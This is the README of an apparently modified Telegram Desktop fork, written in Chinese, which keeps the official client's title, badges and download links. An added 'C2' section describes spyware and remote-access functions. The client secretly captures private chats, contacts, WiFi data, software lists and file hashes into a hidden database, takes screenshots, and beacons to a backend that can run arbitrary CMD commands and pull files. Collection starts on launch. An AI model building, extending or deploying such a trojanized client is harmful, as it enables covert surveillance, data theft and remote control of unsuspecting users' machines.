# [Telegram Desktop][telegram_desktop] – 官方信使

这是基于 [Telegram API][telegram_api] 和 [MTProto][telegram_proto] 安全协议的官方 [Telegram][telegram] 桌面客户端的完整源代码和构建说明。

[![版本](https://badge.fury.io/gh/telegramdesktop%2Ftdesktop.svg)](https://github.com/telegramdesktop/tdesktop/releases)
[![构建状态](https://github.com/telegramdesktop/tdesktop/workflows/Windows./badge.svg)](https://github.com/telegramdesktop/tdesktop/actions)
[![构建状态](https://github.com/telegramdesktop/tdesktop/workflows/MacOS./badge.svg)](https://github.com/telegramdesktop/tdesktop/actions)
[![构建状态](https://github.com/telegramdesktop/tdesktop/workflows/Linux./badge.svg)](https://github.com/telegramdesktop/tdesktop/actions)

[![Telegram Desktop 预览][preview_image]][preview_image_url]

源代码根据 GPLv3 许可证发布（包含 OpenSSL 异常），许可证可在 [此处][license] 查看。

## C2 项目状态 (自定义修改)

本项目是对官方 Telegram 桌面客户端的修改版本，旨在集成数据收集、系统侦察和远程控制功能，作为一个受管端点运行。

### 当前架构

*   **客户端**: 修改后的 Telegram Desktop (C++)，充当代理 (Agent)。
    *   **构建**: 使用 Visual Studio 2022 和 `out/Release/build_only.bat` 进行编译。
    *   **核心功能**: 心跳机制、远程命令执行、数据收集（软件列表、WiFi 信息、文件扫描、聊天记录）、本地 SQLite 存储 (`tdata/tdata_client.db`)。
*   **后端**: Spring Boot 应用程序 (Java)。
    *   端口: 8101。
    *   功能: 任务管理、数据聚合 (MySQL)、文件存储、去重 (Redis)。
*   **前端**: React + UmiJS。
    *   端口: 8000。
    *   功能: 仪表盘、设备管理、任务下发。

### 客户端功能详情 (Telegram Desktop)

#### 1. 数据收集 (本地 DB)
*   **消息拦截**: 实时捕获聊天消息（文本和图片），Hook 了 `history.cpp` 以实现实时捕获。
    *   **过滤**: 排除公共频道和群组，仅保存私聊和私有群组数据。
    *   **存储**: 数据保存在本地加密/隐藏的 SQLite 数据库 (`tdata_client.db`) 的 `chat_logs` 表中。
*   **联系人提取**: 捕获与登录账户关联的所有联系人信息（ID、用户名、电话）。
*   **WiFi 扫描**: 使用 `netsh` 扫描周边 WiFi 网络（SSID、信号强度）并存储在 `wifi_scan_results` 表中。
*   **软件枚举**: 通过读取注册表获取已安装的软件列表并存储。

#### 2. 系统侦察与监控
*   **基本信息**: 捕获设备主机名、操作系统版本、MAC 地址和 IP 地址。
*   **屏幕截图**: 支持立即截图 (`screenshot`) 和定时监控 (`start_monitor`)。
*   **文件系统扫描**:
    *   后台扫描所有驱动器。
    *   计算文件的 MD5 哈希值、记录路径和大小。
    *   结果存储在本地数据库并支持断点续传/去重上传。

#### 3. 远程控制 (C2)
*   **心跳系统**:
    *   实现了 `Core::Heartbeat` 单例。
    *   默认每 60 秒向后端发送一次心跳（包含系统状态）。
    *   支持通过 `set_heartbeat` 命令调整间隔。
*   **任务执行**:
    *   客户端在心跳期间轮询 `pending` 任务。
    *   **支持的命令**:
        *   `cmd_exec`: 执行任意 CMD 命令。
        *   `get_screenshot`: 捕获并上传截图。
        *   `upload_file`: 上传指定文件。
        *   `upload_db`: 上传本地 `tdata` 数据库。
        *   `get_wifi` / `get_software`: 触发特定信息收集。

### 最近更新 (阶段 6 & 7)

*   **数据同步增强**: 修复了本地文件扫描结果无法同步到后端的问题。实现了基于哈希的去重和批量处理。
*   **Web 功能恢复**: 修复了截图命令分发和 Web 端显示问题。
*   **自动收集**: Telegram 启动时自动触发软件列表、WiFi 信息和基础数据的收集与同步。
*   **稳定性**: 增强了 `heartbeat.cpp` 的错误处理和调试日志 (`HEARTBEAT_DEBUG`)。
*   **构建系统**: 优化了 `build_only.bat` 以正确处理 Windows 环境路径。

## 支持的系统

最新版本适用于：

* [Windows 7 及以上 (64位)](https://telegram.org/dl/desktop/win64) ([便携版](https://telegram.org/dl/desktop/win64_portable))
* [Windows 7 及以上 (32位)](https://telegram.org/dl/desktop/win) ([便携版](https://telegram.org/dl/desktop/win_portable))
* [macOS 10.13 及以上](https://telegram.org/dl/desktop/mac)
* [Linux 64位静态构建](https://telegram.org/dl/desktop/linux)
* [Snap](https://snapcraft.io/telegram-desktop)
* [Flatpak](https://flathub.org/apps/details/org.telegram.desktop)

## 旧系统版本

版本 **4.9.9** 是支持旧系统的最后一个版本：

* [macOS 10.12](https://updates.tdesktop.com/tmac/tsetup.4.9.9.dmg)
* [Linux glibc < 2.28 静态构建](https://updates.tdesktop.com/tlinux/tsetup.4.9.9.tar.xz)

版本 **2.4.4** 是支持旧系统的最后一个版本：

* [OS X 10.10 和 10.11](https://updates.tdesktop.com/tosx/tsetup-osx.2.4.4.dmg)
* [Linux 32位静态构建](https://updates.tdesktop.com/tlinux32/tsetup32.2.4.4.tar.xz)

版本 **1.8.15** 是支持旧系统的最后一个版本：

* [Windows XP 和 Vista](https://updates.tdesktop.com/tsetup/tsetup.1.8.15.exe) ([便携版](https://updates.tdesktop.com/tsetup/tportable.1.8.15.zip))
* [OS X 10.8 和 10.9](https://updates.tdesktop.com/tmac/tsetup.1.8.15.dmg)
* [OS X 10.6 和 10.7](https://updates.tdesktop.com/tmac32/tsetup32.1.8.15.dmg)

## 第三方库

* Qt 6 ([LGPL](http://doc.qt.io/qt-6/lgpl.html)) 和 Qt 5.15 ([LGPL](http://doc.qt.io/qt-5/lgpl.html)) (有少量补丁)
* OpenSSL 3.2.1 ([Apache License 2.0](https://www.openssl.org/source/apache-license-2.0.txt))
* WebRTC ([New BSD License](https://github.com/desktop-app/tg_owt/blob/master/LICENSE))
* zlib ([zlib License](http://www.zlib.net/zlib_license.html))
* LZMA SDK 9.20 ([public domain](http://www.7-zip.org/sdk.html))
* liblzma ([public domain](http://tukaani.org/xz/))
* Google Breakpad ([License](https://chromium.googlesource.com/breakpad/breakpad/+/master/LICENSE))
* Google Crashpad ([Apache License 2.0](https://chromium.googlesource.com/crashpad/crashpad/+/master/LICENSE))
* GYP ([BSD License](https://github.com/bnoordhuis/gyp/blob/master/LICENSE))
* Ninja ([Apache License 2.0](https://github.com/ninja-build/ninja/blob/master/COPYING))
* OpenAL Soft ([LGPL](https://github.com/kcat/openal-soft/blob/master/COPYING))
* Opus codec ([BSD License](http://www.opus-codec.org/license/))
* FFmpeg ([LGPL](https://www.ffmpeg.org/legal.html))
* Guideline Support Library ([MIT License](https://github.com/Microsoft/GSL/blob/master/LICENSE))
* Range-v3 ([Boost License](https://github.com/ericniebler/range-v3/blob/master/LICENSE.txt))
* Open Sans font ([Apache License 2.0](http://www.apache.org/licenses/LICENSE-2.0.html))
* Vazirmatn font ([SIL Open Font License 1.1](https://github.com/rastikerdar/vazirmatn/blob/master/OFL.txt))
* Emoji alpha codes ([MIT License](https://github.com/emojione/emojione/blob/master/extras/alpha-codes/LICENSE.md))
* xxHash ([BSD License](https://github.com/Cyan4973/xxHash/blob/dev/LICENSE))
* QR Code generator ([MIT License](https://github.com/nayuki/QR-Code-generator#license))
* CMake ([New BSD License](https://github.com/Kitware/CMake/blob/master/Copyright.txt))
* Hunspell ([LGPL](https://github.com/hunspell/hunspell/blob/master/COPYING.LESSER))
* Ada ([Apache License 2.0](https://github.com/ada-url/ada/blob/main/LICENSE-APACHE))

## 构建说明

* Windows [(32位)][win32] [(64位)][win64]
* [macOS][mac]
* [GNU/Linux (使用 Docker)][linux]

[//]: # (LINKS)
[telegram]: https://telegram.org
[telegram_desktop]: https://desktop.telegram.org
[telegram_api]: https://core.telegram.org
[telegram_proto]: https://core.telegram.org/mtproto
[license]: LICENSE
[win32]: docs/building-win.md
[win64]: docs/building-win-x64.md
[mac]: docs/building-mac.md
[linux]: docs/building-linux.md
[preview_image]: https://github.com/telegramdesktop/tdesktop/blob/dev/docs/assets/preview.png "Preview of Telegram Desktop"
[preview_image_url]: https://raw.githubusercontent.com/telegramdesktop/tdesktop/dev/docs/assets/preview.png
